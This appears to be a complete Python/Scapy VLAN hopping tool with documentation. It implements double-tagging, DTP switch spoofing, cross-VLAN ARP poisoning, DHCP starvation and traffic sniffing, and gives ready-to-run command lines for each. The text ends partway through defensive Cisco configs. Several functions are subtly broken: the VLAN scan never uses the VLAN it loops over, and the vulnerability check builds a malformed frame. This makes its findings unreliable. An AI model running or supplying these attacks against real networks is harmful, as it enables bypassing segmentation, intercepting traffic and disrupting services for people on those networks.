# Python VLAN Hopping Tool

```python
#!/usr/bin/env python3
"""
VLAN Hopping Tool
A comprehensive utility for testing VLAN hopping vulnerabilities in switched networks.
Supports double tagging (802.1Q), switch spoofing, and various VLAN bypass techniques
for authorized security testing.
"""

import argparse
import sys
import os
import time
import threading
import logging
import random
import socket
import struct
from datetime import datetime
from typing import List, Dict, Optional, Tuple, Union
from collections import defaultdict
import signal
import ipaddress

# Try importing scapy with fallback message
try:
    from scapy.all import *
    from scapy.layers.l2 import Ether, Dot1Q, ARP
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.dhcp import DHCP, BOOTP
    from scapy.sendrecv import sendp, srp, sniff
    from scapy.error import Scapy_Exception
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Optional imports for enhanced functionality
try:
    from colorama import init, Fore, Style
    COLORAMA_AVAILABLE = True
    init()  # Initialize colorama for Windows support
except ImportError:
    COLORAMA_AVAILABLE = False

try:
    import netifaces
    NETIFACES_AVAILABLE = True
except ImportError:
    NETIFACES_AVAILABLE = False


class VLANHopAttack:
    """
    Main class for VLAN hopping attacks
    Implements double tagging, switch spoofing, and VLAN bypass techniques
    """
    
    # Common VLAN IDs
    COMMON_VLANS = [1, 10, 20, 30, 40, 50, 60, 70, 80, 90, 100, 
                    200, 300, 400, 500, 600, 700, 800, 900, 1000,
                    2000, 3000, 4000, 4095]
    
    # Native VLAN (typically 1)
    NATIVE_VLAN = 1
    
    # Ethertypes
    ETHERTYPE_8021Q = 0x8100
    ETHERTYPE_IP = 0x0800
    ETHERTYPE_ARP = 0x0806
    
    def __init__(self, interface: str = None, target_ip: str = None,
                 source_mac: str = None, target_mac: str = None,
                 verbose: bool = False, timeout: int = 5):
        """
        Initialize VLAN hopping tool
        
        Args:
            interface: Network interface to use
            target_ip: Target IP address
            source_mac: Source MAC address (None for interface MAC)
            target_mac: Target MAC address (None for broadcast)
            verbose: Enable verbose output
            timeout: Packet timeout in seconds
        """
        if not SCAPY_AVAILABLE:
            raise ImportError(
                "scapy module is required. Install with: pip install scapy"
            )
        
        self.interface = interface or self.get_default_interface()
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.verbose = verbose
        self.timeout = timeout
        
        # Get interface MAC if not specified
        self.source_mac = source_mac or self.get_interface_mac()
        
        # Statistics
        self.stats = {
            'packets_sent': 0,
            'packets_received': 0,
            'responses': 0,
            'vlans_discovered': [],
            'start_time': None
        }
        
        self.lock = threading.Lock()
        self.running = False
        
        # Setup logging
        self.setup_logging()
        
        # Validate network setup
        self.validate_network()
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def setup_logging(self):
        """Configure logging with optional colors"""
        self.logger = logging.getLogger('VLANHop')
        
        # Remove existing handlers
        self.logger.handlers.clear()
        
        # Create console handler
        handler = logging.StreamHandler()
        
        # Set format based on colorama availability
        if COLORAMA_AVAILABLE:
            formatter = logging.Formatter(
                f'{Fore.CYAN}%(asctime)s{Style.RESET_ALL} - '
                f'{Fore.YELLOW}%(levelname)s{Style.RESET_ALL} - %(message)s',
                datefmt='%H:%M:%S'
            )
        else:
            formatter = logging.Formatter(
                '%(asctime)s - %(levelname)s - %(message)s',
                datefmt='%H:%M:%S'
            )
        
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        
        # Set log level
        self.logger.setLevel(logging.DEBUG if self.verbose else logging.INFO)
    
    def get_default_interface(self) -> str:
        """Get default network interface"""
        if NETIFACES_AVAILABLE:
            try:
                gateway = netifaces.gateways()['default'][netifaces.AF_INET]
                return gateway[1]
            except:
                pass
        
        # Fallback to scapy
        try:
            return conf.iface
        except:
            return 'eth0'
    
    def get_interface_mac(self) -> str:
        """Get MAC address of interface"""
        try:
            if NETIFACES_AVAILABLE:
                addrs = netifaces.ifaddresses(self.interface)
                if netifaces.AF_LINK in addrs:
                    return addrs[netifaces.AF_LINK][0]['addr']
            
            # Fallback to scapy
            return get_if_hwaddr(self.interface)
        except:
            # Generate random MAC as last resort
            return "02:00:00:%02x:%02x:%02x" % (
                random.randint(0, 255),
                random.randint(0, 255),
                random.randint(0, 255)
            )
    
    def validate_network(self):
        """Validate network configuration and permissions"""
        # Check if running as root (required for raw sockets)
        if os.geteuid() != 0:
            self.logger.error("This script requires root privileges for packet injection")
            self.logger.error("Please run with: sudo python3 vlan_hopping.py")
            sys.exit(1)
        
        # Check interface
        try:
            test_packet = Ether()/IP(dst="8.8.8.8")/ICMP()
            sendp(test_packet, iface=self.interface, verbose=0, count=1, timeout=1)
            self.logger.info(f"[+] Interface {self.interface} is working")
        except Exception as e:
            self.logger.error(f"[-] Interface {self.interface} error: {e}")
            sys.exit(1)
    
    def create_dot1q_packet(self, outer_vlan: int, inner_vlan: int = None,
                            payload: Packet = None) -> Packet:
        """
        Create 802.1Q tagged packet
        
        Args:
            outer_vlan: Outer VLAN tag
            inner_vlan: Inner VLAN tag (for double tagging)
            payload: Payload packet
        
        Returns:
            Tagged Ethernet frame
        """
        # Default payload if none provided
        if payload is None:
            payload = IP(dst=self.target_ip or "192.168.1.1")/ICMP()
        
        # Build packet with VLAN tags
        if inner_vlan:
            # Double tagging (QinQ)
            packet = Ether(src=self.source_mac, dst=self.target_mac or "ff:ff:ff:ff:ff:ff")
            packet = packet / Dot1Q(vlan=outer_vlan) / Dot1Q(vlan=inner_vlan) / payload
        else:
            # Single tagging
            packet = Ether(src=self.source_mac, dst=self.target_mac or "ff:ff:ff:ff:ff:ff")
            packet = packet / Dot1Q(vlan=outer_vlan) / payload
        
        return packet
    
    def double_tagging_attack(self, outer_vlan: int, inner_vlan: int,
                              count: int = 1, interval: float = 0) -> List[Packet]:
        """
        Perform double tagging (VLAN hopping) attack
        
        Args:
            outer_vlan: Outer VLAN tag (native VLAN)
            inner_vlan: Inner VLAN tag (target VLAN)
            count: Number of packets to send
            interval: Interval between packets
        
        Returns:
            List of sent packets
        """
        self.logger.info(f"[*] Double tagging attack: Outer VLAN={outer_vlan}, Inner VLAN={inner_vlan}")
        
        packets = []
        for i in range(count):
            # Create double-tagged packet
            packet = self.create_dot1q_packet(outer_vlan, inner_vlan)
            
            # Send packet
            sendp(packet, iface=self.interface, verbose=0)
            
            with self.lock:
                self.stats['packets_sent'] += 1
                packets.append(packet)
            
            if interval > 0:
                time.sleep(interval)
        
        self.logger.info(f"[*] Sent {count} double-tagged packets")
        return packets
    
    def switch_spoofing_attack(self, dtp_type: str = 'desirable', 
                               vlan: int = 1, count: int = 5) -> List[Packet]:
        """
        Perform switch spoofing attack using DTP (Dynamic Trunking Protocol)
        
        Args:
            dtp_type: DTP mode ('desirable', 'auto', 'on')
            vlan: VLAN to negotiate
            count: Number of packets to send
        
        Returns:
            List of sent packets
        """
        self.logger.info(f"[*] Switch spoofing attack: DTP={dtp_type}, VLAN={vlan}")
        
        # DTP packet structure
        # Destination MAC: 01-00-0c-cc-cc-cc (CDP/VTP/DTP multicast)
        # SNAP header: AA-AA-03
        # DTP type: 0x2004
        # For simplicity, we'll use Scapy's DTP layer if available
        
        packets = []
        for i in range(count):
            try:
                # Try to use Scapy's DTP if available
                packet = Ether(src=self.source_mac, dst="01:00:0c:cc:cc:cc")
                # Add DTP payload (simplified)
                packet /= LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
                packet /= SNAP(OUI=0x00000c, code=0x2004)
                packet /= Raw(load=struct.pack('!HH', vlan, 0x8335))  # Simplified
                
                sendp(packet, iface=self.interface, verbose=0)
                
                with self.lock:
                    self.stats['packets_sent'] += 1
                    packets.append(packet)
                
                time.sleep(1)
                
            except Exception as e:
                self.logger.debug(f"DTP packet error: {e}")
        
        self.logger.info(f"[*] Sent {count} DTP spoofing packets")
        return packets
    
    def vlan_scan(self, vlan_range: List[int] = None, 
                 scan_type: str = 'arp') -> List[int]:
        """
        Scan for active VLANs
        
        Args:
            vlan_range: List of VLAN IDs to scan
            scan_type: 'arp' or 'icmp'
        
        Returns:
            List of responsive VLANs
        """
        if vlan_range is None:
            vlan_range = self.COMMON_VLANS
        
        self.logger.info(f"[*] Scanning {len(vlan_range)} VLANs using {scan_type}")
        
        responsive_vlans = []
        
        for vlan in vlan_range:
            # Create probe packet
            if scan_type == 'arp':
                # ARP probe
                probe = ARP(pdst=self.target_ip or "192.168.1.1")
            else:
                # ICMP probe
                probe = IP(dst=self.target_ip or "192.168.1.1")/ICMP()
            
            # Single tagged packet
            packet = self.create_dot1q_packet(self.NATIVE_VLAN, payload=probe)
            
            # Send and wait for response
            response = srp1(packet, iface=self.interface, timeout=self.timeout, verbose=0)
            
            if response:
                responsive_vlans.append(vlan)
                self.logger.info(f"[+] VLAN {vlan} responded")
                
                with self.lock:
                    self.stats['responses'] += 1
                    self.stats['vlans_discovered'].append(vlan)
            
            time.sleep(0.1)
        
        self.logger.info(f"[*] Found {len(responsive_vlans)} responsive VLANs")
        return responsive_vlans
    
    def vlan_hop_ping(self, target_vlan: int, target_ip: str,
                      count: int = 4) -> List[Packet]:
        """
        Send ICMP echo requests across VLANs
        
        Args:
            target_vlan: Target VLAN ID
            target_ip: Target IP address
            count: Number of pings
        
        Returns:
            List of responses
        """
        self.logger.info(f"[*] VLAN hopping ping to {target_ip} (VLAN {target_vlan})")
        
        responses = []
        
        for i in range(count):
            # Create double-tagged ICMP packet
            payload = IP(dst=target_ip)/ICMP()
            packet = self.create_dot1q_packet(self.NATIVE_VLAN, target_vlan, payload)
            
            # Send and wait for response
            response = srp1(packet, iface=self.interface, timeout=self.timeout, verbose=0)
            
            if response:
                responses.append(response)
                self.logger.info(f"[+] Response {i+1} received")
                
                with self.lock:
                    self.stats['responses'] += 1
            else:
                self.logger.debug(f"[-] No response for packet {i+1}")
            
            time.sleep(1)
        
        return responses
    
    def vlan_hop_traceroute(self, target_vlan: int, target_ip: str,
                           max_hops: int = 30) -> List[Dict]:
        """
        Perform traceroute across VLANs
        
        Args:
            target_vlan: Target VLAN ID
            target_ip: Target IP address
            max_hops: Maximum number of hops
        
        Returns:
            List of hop information
        """
        self.logger.info(f"[*] VLAN hopping traceroute to {target_ip} (VLAN {target_vlan})")
        
        hops = []
        
        for ttl in range(1, max_hops + 1):
            # Create packet with increasing TTL
            payload = IP(dst=target_ip, ttl=ttl)/ICMP()
            packet = self.create_dot1q_packet(self.NATIVE_VLAN, target_vlan, payload)
            
            # Send and wait for response
            response = srp1(packet, iface=self.interface, timeout=self.timeout, verbose=0)
            
            hop_info = {'ttl': ttl, 'responder': None, 'vlan': None}
            
            if response:
                # Extract responder info
                if response.haslayer(IP):
                    hop_info['responder'] = response[IP].src
                
                # Check if response has VLAN tag
                if response.haslayer(Dot1Q):
                    hop_info['vlan'] = response[Dot1Q].vlan
                
                hops.append(hop_info)
                self.logger.info(f"[+] Hop {ttl}: {hop_info['responder']} (VLAN {hop_info['vlan']})")
                
                with self.lock:
                    self.stats['responses'] += 1
                
                # Check if we reached target
                if hop_info['responder'] == target_ip:
                    break
            else:
                self.logger.debug(f"[-] Hop {ttl}: No response")
            
            time.sleep(0.5)
        
        return hops
    
    def vlan_hopping_attack(self, target_vlan: int, target_ip: str,
                           attack_type: str = 'ping', count: int = 4) -> Dict:
        """
        Comprehensive VLAN hopping attack
        
        Args:
            target_vlan: Target VLAN ID
            target_ip: Target IP address
            attack_type: 'ping', 'traceroute', 'scan'
            count: Number of attempts
        
        Returns:
            Attack results
        """
        results = {
            'target_vlan': target_vlan,
            'target_ip': target_ip,
            'attack_type': attack_type,
            'success': False,
            'responses': [],
            'timestamp': datetime.now().isoformat()
        }
        
        self.logger.info(f"\n{'='*60}")
        self.logger.info(f"VLAN Hopping Attack")
        self.logger.info(f"{'='*60}")
        self.logger.info(f"Target VLAN: {target_vlan}")
        self.logger.info(f"Target IP: {target_ip}")
        self.logger.info(f"Attack Type: {attack_type}")
        self.logger.info(f"{'='*60}\n")
        
        if attack_type == 'ping':
            responses = self.vlan_hop_ping(target_vlan, target_ip, count)
            results['success'] = len(responses) > 0
            results['responses'] = [str(r.summary()) for r in responses]
            
        elif attack_type == 'traceroute':
            hops = self.vlan_hop_traceroute(target_vlan, target_ip, count)
            results['success'] = len(hops) > 0
            results['hops'] = hops
            
        elif attack_type == 'scan':
            vlans = self.vlan_scan([target_vlan])
            results['success'] = target_vlan in vlans
        
        return results
    
    def arp_poison_cross_vlan(self, target_vlan: int, victim_ip: str, spoof_ip: str):
        """
        Perform ARP poisoning across VLANs
        
        Args:
            target_vlan: Target VLAN ID
            victim_ip: Victim IP address
            spoof_ip: IP to spoof (usually gateway)
        """
        self.logger.info(f"[*] Cross-VLAN ARP poisoning: {victim_ip} <- {spoof_ip}")
        
        # Create ARP reply packet
        arp_reply = ARP(
            op=2,  # Reply
            psrc=spoof_ip,
            pdst=victim_ip,
            hwsrc=self.source_mac,
            hwdst="ff:ff:ff:ff:ff:ff"
        )
        
        # Double-tag the packet
        packet = self.create_dot1q_packet(self.NATIVE_VLAN, target_vlan, arp_reply)
        
        # Send ARP reply
        sendp(packet, iface=self.interface, count=5, inter=2, verbose=0)
        
        with self.lock:
            self.stats['packets_sent'] += 5
        
        self.logger.info(f"[*] Sent 5 ARP poisoning packets to VLAN {target_vlan}")
    
    def dhcp_starvation_cross_vlan(self, target_vlan: int, count: int = 100):
        """
        Perform DHCP starvation across VLANs
        
        Args:
            target_vlan: Target VLAN ID
            count: Number of DHCP requests
        """
        self.logger.info(f"[*] Cross-VLAN DHCP starvation on VLAN {target_vlan}")
        
        for i in range(count):
            # Generate random MAC
            fake_mac = "02:00:00:%02x:%02x:%02x" % (
                random.randint(0, 255),
                random.randint(0, 255),
                random.randint(0, 255)
            )
            
            # Create DHCP discover
            dhcp_discover = (
                Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=[int(b,16) for b in fake_mac.split(':')]) /
                DHCP(options=[("message-type","discover"), "end"])
            )
            
            # Double-tag the packet
            packet = self.create_dot1q_packet(self.NATIVE_VLAN, target_vlan, dhcp_discover)
            
            # Send packet
            sendp(packet, iface=self.interface, verbose=0)
            
            with self.lock:
                self.stats['packets_sent'] += 1
            
            if i % 10 == 0:
                self.logger.info(f"[*] Sent {i} DHCP requests")
            
            time.sleep(0.1)
        
        self.logger.info(f"[*] Sent {count} DHCP requests to VLAN {target_vlan}")
    
    def vlan_hop_listener(self, vlan_filter: List[int] = None, 
                         timeout: int = 60) -> List[Packet]:
        """
        Listen for traffic on specific VLANs
        
        Args:
            vlan_filter: List of VLANs to monitor
            timeout: Listening duration
        
        Returns:
            List of captured packets
        """
        self.logger.info(f"[*] Starting VLAN listener (timeout={timeout}s)")
        
        captured_packets = []
        
        def packet_handler(packet):
            if packet.haslayer(Dot1Q):
                vlan_id = packet[Dot1Q].vlan
                
                if vlan_filter is None or vlan_id in vlan_filter:
                    captured_packets.append(packet)
                    
                    with self.lock:
                        self.stats['packets_received'] += 1
                    
                    if self.verbose:
                        self.logger.info(f"[+] VLAN {vlan_id}: {packet.summary()}")
        
        # Start sniffing
        sniff(iface=self.interface, prn=packet_handler, timeout=timeout, store=False)
        
        self.logger.info(f"[*] Captured {len(captured_packets)} packets")
        return captured_packets
    
    def check_vlan_hopping_vulnerability(self) -> Dict:
        """
        Check if network is vulnerable to VLAN hopping
        
        Returns:
            Vulnerability assessment
        """
        results = {
            'double_tagging': False,
            'switch_spoofing': False,
            'native_vlan': None,
            'vlans_found': [],
            'vulnerable': False
        }
        
        self.logger.info("[*] Checking VLAN hopping vulnerabilities...")
        
        # Check native VLAN
        try:
            # Send packet with single tag
            probe = Ether(src=self.source_mac, dst="ff:ff:ff:ff:ff:ff")/IP(dst="8.8.8.8")/ICMP()
            tagged = probe/Dot1Q(vlan=1)
            
            response = srp1(tagged, iface=self.interface, timeout=self.timeout, verbose=0)
            
            if response and response.haslayer(Dot1Q):
                results['native_vlan'] = response[Dot1Q].vlan
                self.logger.info(f"[+] Native VLAN detected: {results['native_vlan']}")
        except:
            pass
        
        # Test double tagging
        try:
            # Send double-tagged packet
            double = self.create_dot1q_packet(1, 100, IP(dst="8.8.8.8")/ICMP())
            response = srp1(double, iface=self.interface, timeout=self.timeout, verbose=0)
            
            if response:
                results['double_tagging'] = True
                self.logger.info("[!] Double tagging may be possible!")
        except:
            pass
        
        # Test switch spoofing
        try:
            # Send DTP packet
            dtp = Ether(src=self.source_mac, dst="01:00:0c:cc:cc:cc")/LLC()/SNAP()/Raw(load="\x01\x00")
            response = srp1(dtp, iface=self.interface, timeout=self.timeout, verbose=0)
            
            if response:
                results['switch_spoofing'] = True
                self.logger.info("[!] Switch spoofing may be possible!")
        except:
            pass
        
        # Scan for VLANs
        vlans = self.vlan_scan(self.COMMON_VLANS[:10])
        results['vlans_found'] = vlans
        
        # Overall assessment
        results['vulnerable'] = results['double_tagging'] or results['switch_spoofing']
        
        if results['vulnerable']:
            self.logger.warning("[!] Network is vulnerable to VLAN hopping!")
        else:
            self.logger.info("[+] Network appears secure against VLAN hopping")
        
        return results
    
    def show_statistics(self):
        """Display attack statistics"""
        elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
        
        print(f"\n{'='*60}")
        print(f"VLAN Hopping Statistics")
        print(f"{'='*60}")
        print(f"Duration: {elapsed:.2f} seconds")
        print(f"Packets sent: {self.stats['packets_sent']:,}")
        print(f"Packets received: {self.stats['packets_received']:,}")
        print(f"Responses: {self.stats['responses']}")
        print(f"VLANs discovered: {', '.join(map(str, self.stats['vlans_discovered']))}")
        print(f"{'='*60}\n")
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        self.logger.info("\n[!] Interrupt received, stopping...")
        self.show_statistics()
        sys.exit(0)


def banner():
    """Display tool banner"""
    banner_text = f"""
{'='*60}
    VLAN Hopping Tool
    For authorized security testing and education only
    Tests: Double Tagging, Switch Spoofing, VLAN Bypass
{'='*60}
    """
    if COLORAMA_AVAILABLE:
        print(f"{Fore.RED}{banner_text}{Style.RESET_ALL}")
    else:
        print(banner_text)


def main():
    """Main function for command-line interface"""
    parser = argparse.ArgumentParser(
        description='VLAN Hopping Tool - Test VLAN isolation vulnerabilities',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Vulnerability assessment
  python vlan_hopping.py -i eth0 --check-vuln
  
  # Double tagging attack
  python vlan_hopping.py -i eth0 --double-tag --outer-vlan 1 --inner-vlan 100 --target-ip 192.168.100.1
  
  # Switch spoofing
  python vlan_hopping.py -i eth0 --switch-spoof --dtp desirable --vlan 1
  
  # VLAN scan
  python vlan_hopping.py -i eth0 --vlan-scan --vlan-range 1-100
  
  # Cross-VLAN ping
  python vlan_hopping.py -i eth0 --vlan-hop-ping --target-vlan 100 --target-ip 192.168.100.10
  
  # Traceroute across VLANs
  python vlan_hopping.py -i eth0 --vlan-traceroute --target-vlan 100 --target-ip 192.168.100.1
  
  # ARP poisoning across VLANs
  python vlan_hopping.py -i eth0 --arp-poison --target-vlan 100 --victim-ip 192.168.100.50 --spoof-ip 192.168.100.1
  
  # Listen for VLAN traffic
  python vlan_hopping.py -i eth0 --listen --vlan-filter 10,20,30 --timeout 30
        """
    )
    
    # Network arguments
    parser.add_argument('-i', '--interface', help='Network interface to use')
    parser.add_argument('--source-mac', help='Source MAC address')
    parser.add_argument('--target-mac', help='Target MAC address')
    parser.add_argument('--target-ip', help='Target IP address')
    parser.add_argument('--timeout', type=int, default=5, help='Packet timeout (default: 5)')
    
    # Attack selection
    parser.add_argument('--check-vuln', action='store_true', help='Check VLAN hopping vulnerabilities')
    parser.add_argument('--double-tag', action='store_true', help='Perform double tagging attack')
    parser.add_argument('--switch-spoof', action='store_true', help='Perform switch spoofing attack')
    parser.add_argument('--vlan-scan', action='store_true', help='Scan for VLANs')
    parser.add_argument('--vlan-hop-ping', action='store_true', help='Ping across VLANs')
    parser.add_argument('--vlan-traceroute', action='store_true', help='Traceroute across VLANs')
    parser.add_argument('--arp-poison', action='store_true', help='ARP poisoning across VLANs')
    parser.add_argument('--dhcp-starve', action='store_true', help='DHCP starvation across VLANs')
    parser.add_argument('--listen', action='store_true', help='Listen for VLAN traffic')
    
    # Attack parameters
    parser.add_argument('--outer-vlan', type=int, default=1, help='Outer VLAN tag (default: 1)')
    parser.add_argument('--inner-vlan', type=int, help='Inner VLAN tag for double tagging')
    parser.add_argument('--target-vlan', type=int, help='Target VLAN ID')
    parser.add_argument('--vlan-range', help='VLAN range (e.g., 1-100 or comma-separated)')
    parser.add_argument('--dtp-type', choices=['desirable', 'auto', 'on'], default='desirable',
                       help='DTP mode for switch spoofing')
    parser.add_argument('--vlan-filter', help='VLAN filter for listening (comma-separated)')
    parser.add_argument('--count', type=int, default=4, help='Number of attempts (default: 4)')
    parser.add_argument('--victim-ip', help='Victim IP for ARP poisoning')
    parser.add_argument('--spoof-ip', help='Spoof IP for ARP poisoning')
    
    # Output options
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--output', '-o', help='Output file for results')
    
    args = parser.parse_args()
    
    # Display banner
    banner()
    
    # Check if scapy is available
    if not SCAPY_AVAILABLE:
        print("[!] scapy module is required. Install with: pip install scapy")
        print("    On Debian/Ubuntu: sudo apt install python3-scapy")
        sys.exit(1)
    
    try:
        # Initialize attack class
        attack = VLANHopAttack(
            interface=args.interface,
            target_ip=args.target_ip,
            source_mac=args.source_mac,
            target_mac=args.target_mac,
            verbose=args.verbose,
            timeout=args.timeout
        )
        
        attack.stats['start_time'] = time.time()
        
        # Parse VLAN range if provided
        vlan_list = None
        if args.vlan_range:
            if '-' in args.vlan_range:
                start, end = map(int, args.vlan_range.split('-'))
                vlan_list = list(range(start, end + 1))
            elif ',' in args.vlan_range:
                vlan_list = [int(v) for v in args.vlan_range.split(',')]
            else:
                vlan_list = [int(args.vlan_range)]
        
        # Parse VLAN filter for listening
        vlan_filter = None
        if args.vlan_filter:
            vlan_filter = [int(v) for v in args.vlan_filter.split(',')]
        
        # Perform selected attack
        results = None
        
        if args.check_vuln:
            results = attack.check_vlan_hopping_vulnerability()
        
        elif args.double_tag and args.inner_vlan:
            results = attack.double_tagging_attack(
                outer_vlan=args.outer_vlan,
                inner_vlan=args.inner_vlan,
                count=args.count
            )
        
        elif args.switch_spoof:
            results = attack.switch_spoofing_attack(
                dtp_type=args.dtp_type,
                vlan=args.outer_vlan,
                count=args.count
            )
        
        elif args.vlan_scan:
            results = attack.vlan_scan(
                vlan_range=vlan_list or attack.COMMON_VLANS,
                scan_type='arp'
            )
        
        elif args.vlan_hop_ping and args.target_vlan and args.target_ip:
            results = attack.vlan_hop_ping(
                target_vlan=args.target_vlan,
                target_ip=args.target_ip,
                count=args.count
            )
        
        elif args.vlan_traceroute and args.target_vlan and args.target_ip:
            results = attack.vlan_hop_traceroute(
                target_vlan=args.target_vlan,
                target_ip=args.target_ip,
                max_hops=args.count
            )
        
        elif args.arp_poison and args.target_vlan and args.victim_ip and args.spoof_ip:
            attack.arp_poison_cross_vlan(
                target_vlan=args.target_vlan,
                victim_ip=args.victim_ip,
                spoof_ip=args.spoof_ip
            )
        
        elif args.dhcp_starve and args.target_vlan:
            attack.dhcp_starvation_cross_vlan(
                target_vlan=args.target_vlan,
                count=args.count * 25  # Scale up count for DHCP
            )
        
        elif args.listen:
            results = attack.vlan_hop_listener(
                vlan_filter=vlan_filter,
                timeout=args.timeout
            )
        
        else:
            parser.print_help()
            sys.exit(1)
        
        # Save results if requested
        if args.output and results:
            import json
            with open(args.output, 'w') as f:
                json.dump({
                    'attack': vars(args),
                    'results': str(results) if not isinstance(results, dict) else results,
                    'stats': attack.stats
                }, f, indent=2, default=str)
            attack.logger.info(f"[+] Results saved to {args.output}")
        
        # Show statistics
        attack.show_statistics()
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
```

# Script Explanation

## Overview
This is a comprehensive VLAN hopping testing tool built with Scapy for network packet manipulation. It demonstrates various VLAN bypass techniques including double tagging (802.1Q), switch spoofing (DTP), and cross-VLAN attacks for authorized security testing and educational purposes.

## Key Features

1. **VLAN Hopping Techniques**:
   - Double tagging (QinQ) attack
   - Switch spoofing (DTP negotiation)
   - Native VLAN hopping
   - Cross-VLAN ARP poisoning
   - Cross-VLAN DHCP starvation

2. **VLAN Discovery**:
   - VLAN scanning with ARP/ICMP probes
   - Active VLAN enumeration
   - Native VLAN detection
   - Traceroute across VLANs

3. **Attack Capabilities**:
   - Cross-VLAN ping sweeps
   - VLAN-aware traceroute
   - ARP spoofing across VLAN boundaries
   - DHCP exhaustion on remote VLANs
   - VLAN traffic monitoring

4. **Vulnerability Assessment**:
   - Double tagging vulnerability check
   - Switch spoofing susceptibility
   - Native VLAN identification
   - Comprehensive security assessment

## Script Structure

### Class: `VLANHopAttack`
Main class implementing all VLAN hopping techniques:

- **`__init__()`**: Initializes network interface and parameters
- **`create_dot1q_packet()`**: Builds single/double tagged packets
- **`double_tagging_attack()`**: Performs QinQ VLAN hopping
- **`switch_spoofing_attack()`**: DTP-based switch impersonation
- **`vlan_scan()`**: Discovers active VLANs
- **`vlan_hop_ping()`**: ICMP across VLAN boundaries
- **`vlan_hop_traceroute()`**: Path discovery through VLANs
- **`arp_poison_cross_vlan()`**: ARP spoofing across VLANs
- **`dhcp_starvation_cross_vlan()`**: DHCP exhaustion on remote VLANs
- **`vlan_hop_listener()`**: Monitors specific VLAN traffic
- **`check_vlan_hopping_vulnerability()`**: Security assessment

## Installation

### Dependencies
```bash
# Install required packages
pip install scapy

# Optional - for interface detection
pip install netifaces colorama

# On Debian/Ubuntu
sudo apt install python3-scapy python3-netifaces python3-colorama
```

### Root Privileges
```bash
# Script requires root for raw packet injection
sudo python3 vlan_hopping.py [options]
```

## VLAN Technology Overview

### 802.1Q Tagging
```
Standard Ethernet Frame:
| Dest MAC | Src MAC | Type | Payload |

802.1Q Tagged Frame:
| Dest MAC | Src MAC | 0x8100 | VLAN Tag | Type | Payload |

VLAN Tag Structure:
| Priority | CFI | VLAN ID (12 bits) |
```

### Double Tagging (QinQ)
```
| Dest MAC | Src MAC | 0x8100 | Outer Tag | 0x8100 | Inner Tag | Payload |
```

### DTP (Dynamic Trunking Protocol)
- Negotiates trunk links between switches
- Can be spoofed to become trunk port
- Allows access to all VLANs

## VLAN Hopping Techniques

### 1. **Double Tagging Attack**
```
How it works:
1. Attacker sends double-tagged frame
2. First switch strips outer tag (native VLAN)
3. Second switch sees inner tag
4. Frame reaches target VLAN

Requires:
- Native VLAN same as attacker's VLAN
- Switch strips only one tag
```

### 2. **Switch Spoofing**
```
How it works:
1. Attacker sends DTP packets
2. Switch negotiates trunk
3. Attacker gets access to all VLANs

Requires:
- DTP enabled on switch port
- No port security
```

### 3. **VLAN Hopping Attacks**
```
Cross-VLAN Attacks:
- Ping sweep other VLANs
- ARP poisoning remote subnets
- DHCP starvation different VLANs
- Service discovery across boundaries
```

## Usage Examples

### Vulnerability Assessment
```bash
# Check for VLAN hopping vulnerabilities
sudo python3 vlan_hopping.py -i eth0 --check-vuln
```

### Double Tagging Attack
```bash
# Basic double tagging
sudo python3 vlan_hopping.py -i eth0 --double-tag --outer-vlan 1 --inner-vlan 100 --target-ip 192.168.100.1

# Multiple packets
sudo python3 vlan_hopping.py -i eth0 --double-tag --outer-vlan 1 --inner-vlan 100 --count 10
```

### Switch Spoofing
```bash
# DTP spoofing
sudo python3 vlan_hopping.py -i eth0 --switch-spoof --dtp desirable --vlan 1

# Multiple attempts
sudo python3 vlan_hopping.py -i eth0 --switch-spoof --dtp auto --count 10
```

### VLAN Discovery
```bash
# Scan VLAN range
sudo python3 vlan_hopping.py -i eth0 --vlan-scan --vlan-range 1-100

# Scan common VLANs
sudo python3 vlan_hopping.py -i eth0 --vlan-scan
```

### Cross-VLAN Attacks
```bash
# Ping remote VLAN
sudo python3 vlan_hopping.py -i eth0 --vlan-hop-ping --target-vlan 100 --target-ip 192.168.100.10 --count 4

# Traceroute across VLANs
sudo python3 vlan_hopping.py -i eth0 --vlan-traceroute --target-vlan 100 --target-ip 192.168.100.1

# ARP poisoning across VLANs
sudo python3 vlan_hopping.py -i eth0 --arp-poison --target-vlan 100 --victim-ip 192.168.100.50 --spoof-ip 192.168.100.1

# DHCP starvation on remote VLAN
sudo python3 vlan_hopping.py -i eth0 --dhcp-starve --target-vlan 100 --count 100
```

### Traffic Monitoring
```bash
# Listen for VLAN traffic
sudo python3 vlan_hopping.py -i eth0 --listen --vlan-filter 10,20,30 --timeout 30

# Verbose monitoring
sudo python3 vlan_hopping.py -i eth0 --listen -v --timeout 60
```

## Security Considerations

⚠️ **IMPORTANT LEGAL AND ETHICAL NOTES:**

1. **Authorization Required**: This tool is for authorized penetration testing only. Unauthorized use may violate computer fraud laws.

2. **Network Disruption**: VLAN hopping can:
   - Bypass network segmentation
   - Access restricted VLANs
   - Intercept cross-VLAN traffic
   - Disable trunk links

3. **Legal Consequences**: Unauthorized VLAN hopping is illegal in most jurisdictions.

4. **Responsible Use**: Only test networks you own or have written permission to test.

## Detection and Prevention

### For Network Defenders:

1. **Disable DTP**:
   ```cisco
   interface GigabitEthernet0/1
     switchport mode access
     switchport nonegotiate
   ```

2. **Use Dedicated Native VLAN**:
   ```cisco
   vlan 999
     name NATIVE
   interface GigabitEthernet0/1
     switchport trunk native vlan 999
   ```

3. **Enable VLAN ACLs**:
   ```cisco
   vlan access-map BLOCK-VLAN-HOP 10
